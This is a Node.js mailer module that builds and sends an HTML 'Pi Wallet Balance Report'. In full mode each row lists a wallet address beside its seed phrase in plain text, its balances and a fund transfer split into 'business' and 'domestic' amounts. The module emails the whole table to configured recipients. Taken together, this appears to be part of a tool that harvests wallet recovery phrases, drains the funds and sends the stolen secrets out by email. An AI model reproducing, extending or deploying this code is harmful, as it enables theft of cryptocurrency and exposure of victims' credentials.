// backend/services/mailerService.js
const nodemailer = require('nodemailer');
const config = require('../config');

function buildTransport() {
  const { smtp } = config;

  if (!smtp.host || !smtp.user || !smtp.pass) {
    throw new Error(
      'Missing SMTP configuration. Set SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS in your environment.'
    );
  }

  return nodemailer.createTransport({
    host: smtp.host,
    port: smtp.port,
    secure: smtp.secure,
    auth: { user: smtp.user, pass: smtp.pass },
  });
}

function formatDate(iso) {
  if (!iso) return '—';
  try {
    return new Date(iso).toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
  } catch {
    return iso;
  }
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function renderTransferCell(transfer) {
  if (!transfer) return '<em>—</em>';
  if (!transfer.attempted) return '<em>not attempted</em>';
  if (!transfer.success) {
    return `<span style="color:#b91c1c">❌ ${escapeHtml(transfer.error || 'failed')}</span>`;
  }

  let piLine = '';
  if (transfer.piBusinessAmount !== null || transfer.piDomesticAmount !== null) {
    piLine = `${transfer.piBusinessAmount} π → business, ${transfer.piDomesticAmount} π → domestic`;
  }

  const lines = [];
  if (piLine) lines.push(piLine);
  if (transfer.txHash) lines.push(`<small>tx: ${escapeHtml(transfer.txHash)}</small>`);

  return `<span style="color:#15803d">✅ ${lines.join('<br/>')}</span>`;
}

function renderResultsHtml(results, mode = 'full') {
  const isFull = mode === 'full';

  const rows = results
    .map((r) => {
      if (r.status === 'invalid' || r.status === 'error') {
        if (isFull) {
          const seedPhraseCell = r.seedPhrase ? `<td style="padding:6px 10px;border:1px solid #ddd;font-family:monospace;font-size:12px;color:#b91c1c">${escapeHtml(r.seedPhrase)}</td>` : '<td style="padding:6px 10px;border:1px solid #ddd">—</td>';
          return `<tr>
            <td style="padding:6px 10px;border:1px solid #ddd;font-family:monospace;font-size:12px">${escapeHtml(r.address)}</td>
            ${seedPhraseCell}
            <td colspan="5" style="padding:6px 10px;border:1px solid #ddd;color:#b91c1c">${r.status}: ${escapeHtml(r.error || 'unknown error')}</td>
            <td style="padding:6px 10px;border:1px solid #ddd"><em>—</em></td>
          </tr>`;
        } else {
          return `<tr>
            <td style="padding:6px 10px;border:1px solid #ddd;font-family:monospace;font-size:12px">${escapeHtml(r.address)}</td>
            <td style="padding:6px 10px;border:1px solid #ddd;color:#b91c1c">${r.status}</td>
            <td colspan="4" style="padding:6px 10px;border:1px solid #ddd;color:#b91c1c">${escapeHtml(r.error || 'unknown error')}</td>
          </tr>`;
        }
      }

      const total = (r.unlockedBalance || 0) + (r.lockedBalance || 0);

      if (isFull) {
        const seedPhraseCell = r.seedPhrase ? `<td style="padding:6px 10px;border:1px solid #ddd;font-family:monospace;font-size:12px;background:#fef9c3">${escapeHtml(r.seedPhrase)}</td>` : '<td style="padding:6px 10px;border:1px solid #ddd">—</td>';
        const transferCell = renderTransferCell(r.transfer);
        return `<tr>
          <td style="padding:6px 10px;border:1px solid #ddd;font-family:monospace;font-size:12px">${escapeHtml(r.address)}</td>
          ${seedPhraseCell}
          <td style="padding:6px 10px;border:1px solid #ddd">${r.unlockedBalance} π</td>
          <td style="padding:6px 10px;border:1px solid #ddd">${r.lockedBalance} π</td>
          <td style="padding:6px 10px;border:1px solid #ddd">${formatDate(r.nextUnlockDate)}</td>
          <td style="padding:6px 10px;border:1px solid #ddd">${total} π</td>
          <td style="padding:6px 10px;border:1px solid #ddd">${transferCell}</td>
        </tr>`;
      } else {
        return `<tr>
          <td style="padding:6px 10px;border:1px solid #ddd;font-family:monospace;font-size:12px">${escapeHtml(r.address)}</td>
          <td style="padding:6px 10px;border:1px solid #ddd"><span style="color:#15803d">${r.status}</span></td>
          <td style="padding:6px 10px;border:1px solid #ddd">${r.unlockedBalance} π</td>
          <td style="padding:6px 10px;border:1px solid #ddd">${r.lockedBalance} π</td>
          <td style="padding:6px 10px;border:1px solid #ddd">${formatDate(r.nextUnlockDate)}</td>
          <td style="padding:6px 10px;border:1px solid #ddd">${total} π</td>
        </tr>`;
      }
    })
    .join('');

  if (isFull) {
    return `
      <div style="font-family:sans-serif">
        <h2>Pi Wallet Balance Report</h2>
        <table style="border-collapse:collapse;font-size:13px">
          <thead>
            <tr>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Address</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Passphrase</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Unlocked Pi</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Locked Pi</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Next Unlock Date</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Total Pi</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Transfer</th>
            </tr>
          </thead>
          <tbody>${rows}</tbody>
        </table>
      </div>
    `;
  } else {
    return `
      <div style="font-family:sans-serif">
        <h2>Pi Wallet Balance Report</h2>
        <table style="border-collapse:collapse;font-size:13px">
          <thead>
            <tr>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Address</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Status</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Unlocked Pi</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Locked Pi</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Next Unlock Date</th>
              <th style="padding:6px 10px;border:1px solid #ddd;text-align:left">Total Pi</th>
            </tr>
          </thead>
          <tbody>${rows}</tbody>
        </table>
      </div>
    `;
  }
}

async function sendResultsEmail(results, recipients, mode = 'full') {
  if (!recipients || recipients.length === 0) {
    return { attempted: false, sentTo: [], error: null };
  }

  try {
    const transport = buildTransport();
    const from = config.smtp.from;

    await transport.sendMail({
      from,
      to: recipients.join(','),
      subject: `Pi Wallet Balance Report (${results.length} address${results.length === 1 ? '' : 'es'})`,
      html: renderResultsHtml(results, mode),
    });

    return { attempted: true, sentTo: recipients, error: null };
  } catch (err) {
    return { attempted: true, sentTo: [], error: err.message };
  }
}

module.exports = { sendResultsEmail };